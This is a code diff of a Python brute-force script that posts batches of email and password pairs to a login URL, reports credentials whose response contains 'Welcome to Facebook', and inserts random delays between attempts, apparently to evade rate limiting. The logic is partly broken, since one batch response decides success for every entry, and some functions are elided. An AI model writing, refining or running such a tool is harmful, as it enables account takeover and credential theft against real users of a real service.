@@ -1,23 +1,33 @@
 import time
 import requests
 import sys
-import random  # Dodane dla generowania losowego opóźnienia
+import random
 
 WAIT_TIME = 5
 PASSWD_PER_REQUEST = 1000
-DELAY_RANGE = (2, 5)  # Zakres opóźnienia w sekundach
+DELAY_RANGE = (2, 5)
 
 class bcolors:
-    # ... (bez zmian)
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
-# ... (bez zmian)
+def banner(argv, usage=False, url=None, emails=None):
+    # ... (bez zmian)
 
 def send_request(url, data):
     req = requests.post(url, data.encode('utf-8'))
     rsp = req.content.decode('utf-8')
     return rsp
 
-# ... (bez zmian)
+def template(entries):
+    t = 'email=%s&pass=%s'
+    return '&'.join([t % (entry.get('email'), entry.get('passwd')) for entry in entries])
 
 def attack(entries, url):
     if len(entries) < 1:
@@ -26,7 +36,6 @@ def attack(entries, url):
     t = template(entries)
     response = send_request(url, t)
 
-    # Check if any successful logins were found
     for entry in entries:
         if "Welcome to Facebook" in response:
             print(bcolors.OKGREEN + "Login successful!" + bcolors.ENDC)
@@ -35,7 +44,6 @@ def attack(entries, url):
             print(bcolors.FAIL + "Login failed!" + bcolors.ENDC)
             print(bcolors.FAIL + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
 
-        # Dodane opóźnienie
         time.sleep(random.uniform(DELAY_RANGE[0], DELAY_RANGE[1]))
 
 def brute_force(url, passwords, emails):
@@ -48,7 +56,6 @@ def brute_force(url, passwords, emails):
                 attack(entries, url)
                 entries = []
 
-    # Attack remaining entries
     attack(entries, url)
 
 if __name__ == "__main__":
